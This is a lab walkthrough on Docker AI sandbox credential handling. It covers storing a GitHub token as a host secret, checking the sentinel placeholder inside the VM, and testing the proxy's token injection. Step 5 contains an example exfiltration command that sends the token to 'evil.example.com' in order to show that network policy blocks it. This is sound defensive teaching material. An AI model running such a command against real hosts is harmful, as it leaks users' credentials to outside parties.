# Lab 3 — Step-by-step

Work from **`lab-03-secrets/workspace/`** unless noted.

## 1. Store the GitHub token on the host

Requires **gh CLI** logged in. Run this **before** `sbx run` — global secrets apply when the sandbox is created.

```bash
gh auth status
echo "$(gh auth token)" | sbx secret set -g github
sbx secret ls
```

Never commit tokens to this repository.

> Cursor still needs `sbx secret set -g cursor` from Lab 1 to run the agent. This lab focuses on the **GitHub** credential proxy.

## 2. Start Cursor from the workspace

```bash
cd lab-03-secrets/workspace
sbx run cursor . --name lab3
```

## 3. Check the sentinel value (second terminal)

The proxy wires GitHub auth through **`GH_TOKEN`**, not `GITHUB_TOKEN`:

```bash
sbx exec lab3 -- bash -c 'echo "GH_TOKEN=$GH_TOKEN"'
sbx exec lab3 -- bash -c 'test -z "$GITHUB_TOKEN" && echo "GITHUB_TOKEN unset (expected)"'
```

Expected `GH_TOKEN` output:

```text
GH_TOKEN=gho_sbxproxymanaged000000000000000000000
```

A placeholder shaped like a token — **not** your real `gho_…` value from `gh auth token`.

## 4. Verify proxy injection with a live API call

```bash
sbx exec lab3 -- bash -c 'echo "$GH_TOKEN" | grep -q sbxproxymanaged && echo "sentinel OK"'
```

```bash
sbx exec lab3 -- curl -s -o /dev/null -w "HTTP %{http_code}\n" \
  -H "Authorization: Bearer $GH_TOKEN" \
  https://api.github.com/user
```

Expected:

```text
sentinel OK
HTTP 200
```

The VM sends the sentinel in the `Authorization` header; the host proxy replaces it with your real token before the request reaches GitHub.

> Requires a **valid** GitHub token in step 1 (`gh auth status`). Expired tokens still show `gho_sbxproxymanaged…` but the API call returns `401`.

## 5. Exfiltration attempt

```bash
sbx exec lab3 -- curl -s -o /dev/null -w "HTTP %{http_code}\n" \
  "https://evil.example.com?k=$GH_TOKEN"
```

Expected: blocked or failed — network policy prevents sending the sentinel to unapproved hosts.

## 6. Clean up

```bash
sbx rm lab3 --force
sbx secret rm -g github --force
```

On shared machines, remove the secret after the lab.

---

## Docker docs

| Topic | Link |
|-------|------|
| Credential proxy | [Secrets and outbound injection](https://docs.docker.com/ai/sandboxes/security/credentials/) |
| GitHub token | [GitHub service in credentials docs](https://docs.docker.com/ai/sandboxes/security/credentials/#github-token) |
| Security | [Sandbox security model](https://docs.docker.com/ai/sandboxes/security/) |
| Network policy | [Local governance and allow-lists](https://docs.docker.com/ai/sandboxes/governance/local/) |
